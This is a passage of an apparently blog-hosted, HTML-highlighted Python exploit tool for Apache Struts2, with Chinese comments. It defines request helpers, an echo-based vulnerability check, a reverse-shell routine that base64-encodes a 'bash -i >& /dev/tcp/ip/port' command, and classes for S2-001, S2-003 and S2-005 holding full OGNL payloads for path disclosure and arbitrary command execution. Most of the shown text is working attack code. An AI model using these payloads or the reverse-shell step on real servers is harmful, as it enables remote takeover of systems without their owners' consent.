class="string">&#x27;UTF-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;GET请求发送包装&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        status_code = html.status_code</span><br><span class="line">        <span class="keyword">if</span> status_code == <span class="number">302</span>:</span><br><span class="line">            html = html.headers.get(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> status_code == <span class="number">200</span>:</span><br><span class="line">            html = html.content.decode(encoding)</span><br><span class="line">            html = html.replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            html = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接超时错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ERROR:&#x27;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stream</span>(<span class="params">url, headers=<span class="literal">None</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;分块接受数据&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        lines = requests.get(url, headers=headers, timeout=_tiemout, stream=<span class="literal">True</span>, proxies=proxies)</span><br><span class="line">        html = <span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines.iter_lines():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;\r\n&#x27;</span>.join(html).strip()</span><br><span class="line">    <span class="keyword">except</span> ChunkedEncodingError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;\r\n&#x27;</span>.join(html).strip()</span><br><span class="line">    <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接超时错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ERROR:&#x27;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>, files=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;POST请求发送包装&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=_tiemout, files=files)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        <span class="keyword">return</span> html.replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">except</span> ChunkedEncodingError <span class="keyword">as</span> e:</span><br><span class="line">        html = post_stream(url, data, headers, encoding, files)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接超时错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ERROR:&#x27;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_stream</span>(<span class="params">url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>, files=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;分块接受数据&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        lines = requests.post(url, data=data, headers=headers, timeout=_tiemout, stream=<span class="literal">True</span>, proxies=proxies,</span><br><span class="line">                              files=<span class="literal">None</span>)</span><br><span class="line">        html = <span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines.iter_lines():</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;\r\n&#x27;</span>.join(html).strip()</span><br><span class="line">    <span class="keyword">except</span> ChunkedEncodingError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;\r\n&#x27;</span>.join(html).strip()</span><br><span class="line">    <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接超时错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ERROR:&#x27;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_multipart</span>(<span class="params">exp</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;创建multipart/form-data数据包&quot;&quot;&quot;</span></span><br><span class="line">    boundary = <span class="string">&#x27;----------%s&#x27;</span> % <span class="built_in">hex</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">    data = <span class="built_in">list</span>()</span><br><span class="line">    data.append(<span class="string">&#x27;--%s&#x27;</span> % boundary)</span><br><span class="line">    content = <span class="string">b&#x27;x&#x27;</span></span><br><span class="line">    decoded_content = content.decode(<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line">    data.append(<span class="string">&#x27;Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;&#123;exp&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(exp=exp))</span><br><span class="line">    data.append(<span class="string">&#x27;Content-Type: text/plain\r\n&#x27;</span>)</span><br><span class="line">    data.append(decoded_content)</span><br><span class="line">    data.append(<span class="string">&#x27;--%s--\r\n&#x27;</span> % boundary)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\r\n&#x27;</span>.join(data), boundary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_file</span>(<span class="params">url, exp, headers=<span class="literal">None</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-046漏洞专用&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        coded_params, boundary = encode_multipart(exp)</span><br><span class="line">        <span class="keyword">if</span> proxies:</span><br><span class="line">            proxy_support = urllib.request.ProxyHandler(proxies)</span><br><span class="line">            opener = urllib.request.build_opener(proxy_support)</span><br><span class="line">            urllib.request.install_opener(opener)</span><br><span class="line">        req = urllib.request.Request(url, coded_params.encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>))</span><br><span class="line">        req.add_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;multipart/form-data; boundary=%s&#x27;</span> % boundary)</span><br><span class="line">        <span class="keyword">if</span> headers:</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> headers.items():</span><br><span class="line">                req.add_header(key, value)</span><br><span class="line">        resp = urllib.request.urlopen(req)</span><br><span class="line">        html = resp.read().decode(encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接超时错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ERROR:&#x27;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_cmd</span>(<span class="params">cmd, <span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;命令解析，将要执行的命令解析为字符串格式&quot;&quot;&quot;</span></span><br><span class="line">    cmd = shlex.split(cmd)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;string&#x27;</span>:</span><br><span class="line">        cmd_str = <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&#x27;&quot;,&quot;&#x27;</span>.join(cmd) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="string">&#x27;xml&#x27;</span>:</span><br><span class="line">        cmd_str = <span class="string">&#x27;&lt;string&gt;&#x27;</span> + <span class="string">&#x27;&lt;/string&gt;&lt;string&gt;&#x27;</span>.join(cmd) + <span class="string">&#x27;&lt;/string&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd_str = cmd</span><br><span class="line">    <span class="keyword">return</span> cmd_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_headers</span>(<span class="params">headers</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;将headers字符串解析为字典&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> headers:</span><br><span class="line">        <span class="keyword">return</span> default_headers</span><br><span class="line">    new_headers = copy.deepcopy(default_headers)</span><br><span class="line">    headers = headers.split(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> header <span class="keyword">in</span> headers:</span><br><span class="line">        header = header.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        new_headers[header[<span class="number">0</span>].strip()] = header[<span class="number">1</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> new_headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hash</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取随机字符串&quot;&quot;&quot;</span></span><br><span class="line">    letters = string.ascii_letters</span><br><span class="line">    rand = <span class="string">&#x27;&#x27;</span>.join(random.sample(letters, <span class="number">10</span>))</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.md5(rand.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo_check</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过echo输出检查漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">    hash_str = get_hash()</span><br><span class="line">    html = self.exec_cmd(<span class="string">&quot;echo &quot;</span> + hash_str)</span><br><span class="line">    <span class="keyword">if</span> html.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">elif</span> hash_str <span class="keyword">in</span> html:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125;/&#123;port&#125; 0&gt;&amp;1&quot;</span>.<span class="built_in">format</span>(ip=ip, port=port)</span><br><span class="line">    cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    shell = self.shell.replace(<span class="string">&#x27;SHELL&#x27;</span>, cmd)</span><br><span class="line">    html = self.exec_cmd(shell)</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查文件是否存在&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        click.secho(<span class="string">&quot;[ERROR] &#123;file&#125;文件不存在!&quot;</span>.<span class="built_in">format</span>(file=file_path), fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_path, encoding=<span class="string">&#x27;UTF-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;读文件，默认使用UTF-8编码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> check_file(file_path):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_urls</span>(<span class="params">file</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;读取URL文件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> check_file(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            urls = f.readlines()</span><br><span class="line">        urls = [url.strip() <span class="keyword">for</span> url <span class="keyword">in</span> urls <span class="keyword">if</span> url <span class="keyword">and</span> url.strip()]</span><br><span class="line">        <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_int</span>(<span class="params">name, t</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查int变量&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t = <span class="built_in">int</span>(t)</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        click.secho(<span class="string">&quot;[ERROR] 参数&#123;name&#125;必须为整数!&quot;</span>.<span class="built_in">format</span>(name=name), fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_001</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-001漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span></span><br><span class="line">    check_poc = <span class="string">&quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath(&#x27;%2F&#x27;))%2C%23response.flush()%2C%23response.close()%7D&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            self.data = <span class="string">&quot;username=test&amp;password=&#123;exp&#125;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        num1 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        num2 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        poc = self.check_poc.<span class="built_in">format</span>(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=poc)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = <span class="built_in">str</span>(num1 + num2)</span><br><span class="line">        <span class="keyword">if</span> html.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">elif</span> nn <span class="keyword">in</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-001&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=self.web_path)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_003</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-003漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据; 支持任意命令执行&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-003&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + <span class="string">&#x27;?&#x27;</span> + payload, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_005</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-005漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据; 支持获取WEB路径,任意命令执行&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&amp;%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&amp;%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29&quot;</span></span><br><span class="line">    exec_payload1 = <span class="string">&quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span></span><br><span class="line">    exec_payload2 = <span class="string">&quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43mycmd%5C75%5C%27&#123;cmd&#125;%5C%27%27%29%28d%29%29&amp;%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&amp;%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&amp;%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&amp;%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&amp;%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&amp;%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 